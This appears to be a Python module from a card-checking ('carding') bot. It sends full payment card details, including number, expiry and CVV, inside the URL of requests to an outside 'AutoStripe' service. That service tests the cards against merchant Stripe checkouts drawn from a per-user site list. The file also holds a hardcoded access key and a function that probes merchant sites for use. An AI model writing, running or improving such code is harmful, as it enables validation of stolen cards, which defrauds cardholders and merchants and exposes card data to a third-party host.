import json
import httpx
import asyncio

# AutoStripe API Configuration
AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_GATEWAY = "autostripe"
AUTOSTRIPE_KEY = "Blackxcard"

def get_autostripe_site(user_id):
    """Get user's autostripe site from sites.json"""
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id), {}).get("site")
    except Exception:
        return None

def get_autostripe_info(user_id):
    """Get user's full autostripe info including site and gate"""
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except Exception:
        return None

async def check_autostripe(user_id, cc, site=None):
    """
    Check card using AutoStripe API
    Endpoint: /gateway=autostripe/key=Blackxcard/site=example.com/cc=card|mm|yyyy|cvv
    """
    if not site:
        site = get_autostripe_site(user_id)
    if not site:
        return "Site Not Found"
    
    # Build the AutoStripe API URL
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"
    
    retries = 0
    max_retries = 3
    
    while retries < max_retries:
        try:
            async with httpx.AsyncClient(timeout=120.0) as client:
                response = await client.get(url)
                response_text = response.text.strip()
                
                # Return raw response
                if response_text:
                    return response_text
                else:
                    return "NO_RESPONSE"
                
        except httpx.ReadTimeout:
            retries += 1
            if retries >= max_retries:
                return "Request Timeout"
            await asyncio.sleep(1)
        except httpx.ConnectError:
            retries += 1
            if retries >= max_retries:
                return "Connection Failed"
            await asyncio.sleep(1)
        except Exception as e:
            return f"Error: {str(e)}"
    
    return "Connection Failed"

async def verify_autostripe_site(site, test_cc):
    """
    Verify if a site works with AutoStripe
    Returns dict with site info if supported, None otherwise
    """
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={test_cc}"
    
    try:
        async with httpx.AsyncClient(timeout=90.0) as client:
            response = await client.get(url)
            response_text = response.text.strip()
            
            # If we get any response, site is working
            if response_text and len(response_text) > 0:
                # Check if it's not an error response
                response_upper = response_text.upper()
                if "NOT FOUND" not in response_upper and "INVALID" not in response_upper and "ERROR" not in response_upper:
                    return {
                        "supported": True,
                        "response": response_text,
                        "gateway": "AutoStripe"
                    }
                else:
                    # Even error responses mean site is connected
                    return {
                        "supported": True,
                        "response": response_text,
                        "gateway": "AutoStripe"
                    }
            
            return None
            
    except Exception as e:
        print(f"[verify_autostripe_site error] {e}")
        return None
